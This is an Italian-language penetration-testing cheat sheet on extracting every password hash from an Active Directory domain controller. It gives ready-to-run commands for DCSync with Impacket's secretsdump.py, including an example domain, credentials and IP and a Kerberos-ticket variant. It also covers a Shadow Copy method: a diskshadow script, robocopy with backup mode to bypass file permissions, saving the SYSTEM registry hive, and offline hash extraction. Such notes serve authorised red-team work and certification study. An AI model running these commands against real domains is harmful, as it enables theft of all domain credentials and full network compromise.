# DCSync & NTDS.DIT Extraction

| Caratteristica | Dettaglio |
| :--- | :--- |
| **Tool necessari** | `Impacket (secretsdump.py)`, `diskshadow`, `robocopy`, `reg` |
| **SO Target** | Windows (Domain Controller) |
| **Quando effettuare** | Quando si hanno privilegi di `Backup Operators`, `Domain Admin` o diritti di replica |
| **Info Utili** | Estrazione di tutti gli hash del dominio dal database NTDS.DIT |

### Funzionamento
`NTDS.DIT` è il database di Active Directory in cui sono memorizzati tutti gli hash degli utenti. È possibile estrarli tramite replicazione (DCSync) o tramite copia fisica del file (Shadow Copy).

### Metodo 1: DCSync (Remoto)
Richiede privilegi di `GetChangesAll`.

**Comando Generico:**
```bash
secretsdump.py <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
*Esempio:*
```bash
secretsdump.py eh.local/administrator:Pass123@10.10.10.117
```

**Utilizzando Kerberos (Ticket):**
```bash
KRB5CCNAME=<TICKET_FILE> secretsdump.py -k -no-pass <DOMAIN_FQDN>
```

### Metodo 2: Shadow Copy (Locale)
Utile se si ha il privilegio `SeBackupPrivilege`.

1. Creare script `raj.dsh`:
```text
set context persistent nowriters
add volume c: alias raj
create
expose %raj% z:
```
2. Eseguire Diskshadow:
```powershell
diskshadow /s raj.dsh
```
3. Copiare i file (bypassando le ACL):
```powershell
robocopy /b z:\windows\ntds . ntds.dit
reg save hklm\system system
```
4. Scaricare i file ed estrarre gli hash in locale:
```bash
secretsdump.py -ntds ntds.dit -system system local
```

### URL Fondamentali
- [Windows Privilege Escalation SeBackupPrivilege (Hacking Articles)](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)
- [The Hacker Recipes - DCSync](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync)
- [Impacket GitHub](https://github.com/fortra/impacket)
